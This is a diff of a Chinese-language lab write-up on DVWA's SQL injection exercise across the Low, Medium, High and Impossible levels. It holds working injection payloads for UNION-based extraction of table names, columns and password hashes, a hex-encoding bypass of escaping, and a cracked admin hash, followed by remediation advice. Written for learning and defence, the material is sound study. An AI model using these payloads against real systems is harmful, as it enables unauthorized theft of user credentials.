@@ -1,235 +1,153 @@
-# SQL Injection,
-# 注意：所有select后面的第一个值的后面需要加上collate utf8_general_ci，否则会报错**
-# LOW等级实操
-## 1.原理
-1. 在id里面输入1
-2. 正常返回结果类似：
-```html
-ID: 1
-First name: admin
-Surname: admin
-```
-3. 说明后端执行了
-```javascript
-SELECT first_name, last_name 
-FROM users 
-WHERE user_id = '1';
+# SQL Injection
+
+页面只有一个输入框，输 ID 查用户名。后端把输入直接拼进 SQL，所以输什么就查什么。
+
+Low 的源码长这样：
+
+```php
+$id = $_GET['id'];
+$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
 ```
 
-## 2.判断是否存在SQL注入
-1. 输入1'
-2. 如果页面报SQL错误，例如
-```html
-You have an error in your SQL syntax
-```
-**说明输入被直接拼接进了SQL语句，存在SQL注入风险**
+`$id` 前后有单引号，这是字符型注入。知道这一点，后面所有 payload 都是从"怎么把这个引号闭合掉"开始的。
 
-## 3.使用恒真条件绕过
-1. 输入1' OR '1'='1
-2. 可能返回多个用户信息
-3. 对应的SQL逻辑类似于:
-```html
-SELECT first_name, last_name 
-FROM users 
-WHERE user_id = '1' OR '1'='1';
-```
-4. 因为'1' = '1'，永远为真，所以会返回表中的多条数据
-## 4.使用注释符截断后续语句
-mysql中常见注释符
-```
--- 
-#
-/**/
-```
->比如1' OR '1'='1' #
+## Low
 
-## 5.判断字段数量
-**使用ORDER BY判断查询结果有几列**
-1. 输入1' ORDER BY 1 --
-如果正常，就继续
-2. 1' ORDER BY 2 --
-如果正常，就继续
-3. 1' ORDER BY 3 --
-如果报错，说明查询结果只有两列
-4. 因此原SQL查询大概返回了两列：first_name, last_name
+先确认现象。输 `1`，正常返回 admin；输 `1'`，页面报 `You have an error in your SQL syntax`。报错能出来，说明输入被当成了 SQL 的一部分，这就是注入点。
 
-## 6.使用UNION SELECT测试回显位
-因为由上述内容可知字段数位2，所以使用
-```html
-1' UNION SELECT 1,2 --
+`1' OR '1'='1` 一次就出来五条记录。原因写在 SQL 里就是：
+
+```sql
+WHERE user_id = '1' OR '1'='1'
 ```
 
-## 7.获取当前数据库名
-1. 输入1' UNION SELECT database(),2 --
-2. 可能返回dvwa
-3. 也可以1' UNION SELECT database(),user() --
-4. database()用户查看当前数据库名
-5. user()用于查看当前数据库连接用户
+`'1'='1'` 永远成立，where 条件对整张表都成立。后面的 `'` 会多出来一个，所以要拿注释符收尾，`#` 或 `-- ` 都行（`--` 后面必须跟空格，少了空格 MySQL 不认）。
 
-##  8.获取 MySQL 版本
-1. 输入1' UNION SELECT version(),2 --
-2. 1' UNION SELECT @@version,2 --
+接着要搞清楚这个查询返回几列，不然 UNION 对不上。用 `ORDER BY` 试：
 
-## 9.获取当前数据库中的表名
-1. 输入
-```html
-1' UNION SELECT table_name,2 
-FROM information_schema.tables 
-WHERE table_schema=database() --
 ```
-2. 可能看到类似表名: guestbook.user
-
-## 10.获取users表的字段名
-1. 输入
-```html
-1' UNION SELECT column_name collate utf8_general_ci,2 
-FROM information_schema.columns 
-WHERE table_name='users' --
-```
-<img src='low2.png'>
-2. 可能得到：
-```html
-user_id
-first_name
-last_name
-user
-password
-avatar
-last_login
-failed_login
-```
-3. 如果需要限定当前数据库，可以写
-```html
-1' UNION SELECT column_name collate utf8_general_ci,2 
-FROM information_schema.columns 
-WHERE table_schema=database() 
-AND table_name='users' -- 
+1' ORDER BY 1 -- 
+1' ORDER BY 2 -- 
+1' ORDER BY 3 --     ← 这里报错
 ```
 
-## 11读取users表中的用户名和密码哈希
-1. 输入：1' UNION SELECT user collate utf8_general_ci,password FROM users --
-2. 可能得到：
-```javascript
-admin
-5f4dcc3b5aa765d61d8327deb882cf99
+第 3 列报错说明只有两列，正好对应源码里的 `first_name, last_name`。
+
+回显位用 `1' UNION SELECT 1,2 -- ` 确认，页面显示 1 和 2，说明两列都能显示出来。
+
+然后按库、表、字段、数据的顺序取：
+
 ```
-3. 这个密码哈希对应的明文通常是：password
+1' UNION SELECT database(),user() --
+1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() --
+1' UNION SELECT column_name collate utf8_general_ci,2 FROM information_schema.columns WHERE table_name='users' --
+1' UNION SELECT user,password FROM users --
+```
 
-## 12.使用contact合并显示:
-1. 你可以输入1' UNION SELECT user,concat(first_name,':',last_name,':',password) FROM users --
-2. 也可以输入1' UNION SELECT user,concat(user,':',password) FROM users --
+最后一条出来 `admin` 和 `5f4dcc3b5aa765d61d8327deb882cf99`，这个 MD5 是 `password`。
 
-# SQL Injection -Medium 等级实操
-## 1. 源码分析
-```HTML
+![Low 取字段名](low1.png)
+
+![Low 取到账号和哈希](low2.png)
+
+一次显示不完的话用 `concat()` 把几列拼成一个字符串塞进同一列：
+
+```
+1' UNION SELECT user,concat(user,':',password) FROM users --
+```
+
+## Medium
+
+Medium 先把源码看了一遍。有两处变化：
+
+```php
 $id = mysqli_real_escape_string($conn, $_POST['id']);
-
 $query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
-注意这里的WHERE user_id = $id
-id没有被单引号包裹，所以这是一个数字型注入
 ```
-## 2. burp操作
-1. 可以使用burp suite抓包修改参数
-2. 设置浏览器代理
-3. 在DVWA页面选择一个ID
-4. 点击submit
-5. 在Burp厘米拦截请求
-6. 找到参数id=1,修改为id=1 or 1=1
 
-## 3.数字型注入测试
-1. 因为是数字型，所有不需要单引号
-2. 输入或修改参数为1 or 1=1
-3. 如果返回多条用户信息，说明注入成功
+第一，`$id` 外面没有引号了，这是数字型注入，不用闭合单引号。第二，前端从输入框变成了下拉框，只给 1 到 5。
 
-## 4.判断字段数
-1. 1 order by 1
-2. 1 order by 2
-3. 1 order by 3
->如果order by 3 报错，说明字段数为2
-## 5. Union select 测试
->输入：1 Union SELECT 1,2
-如果页面回显1和2，说明可以继续利用
+下拉框没用。请求是 POST，Burp 拦下来直接改 `id=1` 为 `id=1 or 1=1`，照样出多条。
 
-## 6.获取数据库名
->输入1 UNION SELECT database(),2
-<img src='medium1.png'>
+数字型下所有 payload 去掉开头的单引号就行：
 
-## 7.获取表名
->输入1 UNION SELECT table_name collate utf8_general_ci,2 FROM information_schema.tables WHERE table_schema=database()
-<img src='medium2.png'>
-
-## 8.获取字段名
->1 UNION SELECT column_name collate utf8_general_ci,2 FROM information_schema.columns WHERE table_name=0x7573657273
-<img src='medium3.png'>
-
-1. 由于编码不一样，需要在column后面加上collate utf8_general_ci
-2. Medium 难度使用了 mysqli_real_escape_string 转义，所以你的 'users' 被转成了 \'users\'，变成了一段不完整的字符串,所以'users' 的十六进制是 0x7573657273
-3. 一行写完，不要有回车。
-
-## 9.读取用户名的和密码
->输入1 UNION SELECT user,password FROM users
-<img src='medium4.png'>
-
-## 10.学习重点
-1. 前端限制不等于安全
-2. 下拉框也可以通过抓包修改参数
-3. 数字型注入不需要单引号
-4. mysqli_real_escape_string() 不是万能防御
-5. 如果 SQL 语句没有使用参数化查询，仍然可能注入
-6. 十六进制可以绕过部分字符串过滤
-
-# High难度
-```html
-SELECT first_name, last_name 
-FROM users 
-WHERE user_id = '$id' 
-LIMIT 1;
 ```
->limit 1 会限制返回一条数据，但是并没有真正解决SQL注入问题
-## 1判断注入点
-1. 输入1'
-如果报错，说明仍然存在字符型注入
+1 or 1=1
+1 order by 3
+1 union select 1,2
+```
 
-## 2使用注释符肉啊过LImit1
->1' OR '1'='1' # 或者1' OR '1'='1' --
-可以把后面的limit 1 注释掉
-## 3判断字段数
-1. 1' order by 1 #
-2. 1' order by 2 #
-3. 1' order by 3 #
->如果order by 3 报错，说明字段数为2
+真正卡住的地方在取字段名这一步。按 Low 的写法发：
 
-##  4UNION SELECT测试
->1' UNION SELECT 1,2 --
-## 5获取数据库名
->1' UNION SELECT database(),user() --
-## 6获取表名
->1' UNION SELECT table_name collate utf8_general_ci,2 FROM information_schema.tables WHERE table_schema=database() --
-## 7获取字段名
->1' UNION SELECT column_name collate utf8_general_ci,2 FROM information_schema.columns WHERE table_name='users' --
-## 获取users表数据
->1' UNION SELECT user,password FROM users --
-## 学习重点
-1. 增加 LIMIT 1 不是有效防御
-2. SQL 注入的本质是 SQL 拼接
-3. 注释符可以截断后续 SQL
-4. 只限制返回数量不能阻止数据泄露
-5. 真正有效的防御是参数化查询、预编译语句、严格类型校验
+```
+1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'
+```
 
-# Impossible等级分析
-impossible通常已经使用了比较正确的防御方式
-```html
-$stmt = $db->prepare(
-    "SELECT first_name, last_name FROM users WHERE user_id = ?"
-);
+空的。原因是 `mysqli_real_escape_string` 把 `'users'` 里的单引号转成 `\'users\'`，字符串废了，`table_name` 匹配不上任何东西。
 
+绕法是别用引号，用十六进制。`users` 的十六进制是 `0x7573657273`，MySQL 会把它当字符串处理：
+
+```
+1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name=0x7573657273
+```
+
+![Medium 取字段名](medium3.png)
+
+还有一个小坑：`column_name` 那列不加 `collate utf8_general_ci` 会报排序规则冲突，整条 payload 直接 500。加在函数后面就行：
+
+```
+1 UNION SELECT column_name collate utf8_general_ci,2 FROM information_schema.columns ...
+```
+
+顺带说一句，这条 payload 必须写成一行。分成两行发，Burp 会把换行当参数分隔，后半截就丢了。
+
+![Medium 取库名](medium1.png)
+
+![Medium 取表名](medium2.png)
+
+![Medium 取数据](medium4.png)
+
+## High
+
+High 在 SQL 末尾加了 `LIMIT 1`：
+
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;
+```
+
+本意是只返回一条，看起来像防护。实际上 `LIMIT` 只是限制返回行数，管不住注入，而且它在语句屁股上，用注释符就能切掉：
+
+```
+1' OR '1'='1' #
+```
+
+`#` 把后面的 `' LIMIT 1` 全部注释，语句结构回到 Low 的样子。后面取数流程和 Low 完全一样，只是每条都要带 `#` 或者 `-- ` 收尾。
+
+这一级我没截到图，因为页面表现和 Low 几乎一样，多截一张也看不出区别。记结论就够：`LIMIT 1` 限制的是返回行数，不是注入。
+
+## Impossible 为什么打不进去
+
+```php
+$stmt = $db->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
 $stmt->bind_param("i", $id);
 $stmt->execute();
 ```
-## 为什么该难度无法注入
-1. 因为SQL和数据被分开处理
-2. 例如用户输入1' OR '1'='1
-3. 在预编译语句中，它不会被当作 SQL 逻辑执行，而是被当作普通字符串或参数值。
-4. 也就是说,数据库收到的是：WHERE user_id = ?
-5. 参考值是1' OR '1'='1
-6. 而不是拼接成WHERE user_id = '1' OR '1'='1'
+
+关键在 `?`。SQL 语句在传输之前就已经定型了，用户输入是后到的参数值，数据库不把它当语句解析。
+
+拿 `1' OR '1'='1` 打进去，数据库收到的查询结构仍然是 `WHERE user_id = ?`，这个值整体被当成一个字符串去比较，找不到匹配就返回空。引号没能闭合任何东西，因为根本没有拼接这一步。
+
+## 我卡住的地方
+
+- `1'` 一开始只看到页面变了，没意识到是报错。看源码才知道 DVWA 把 SQL 错误显示出来了，很多真实站点会把错误吞掉，那时候要靠时间盲注或者布尔差异判断。
+- `ORDER BY 3` 报错当时以为是语句写错，其实是列数超了。这个报错本身就是信息。
+- Medium 取字段名那一步空了十分钟，一直在怀疑 payload 拼错，没想到是转义把引号吃了。
+
+## 怎么修
+
+1. 参数化查询。PHP 里是 PDO 或 mysqli 的 `prepare` + `bind_param`，这是唯一能根治的做法。
+2. 类型强校验。ID 只应该是整数，`filter_var($id, FILTER_VALIDATE_INT)` 一行就挡掉大部分。
+3. 数据库账号降权。Web 应用不该用 root 连库，只给需要的库和表的查询权限，注入成功也读不到别的数据。
+4. 关掉错误回显。生产环境把 SQL 报错写日志，不回显到页面。
+
+前两条是必须的，后两条是出了事能少丢点东西。
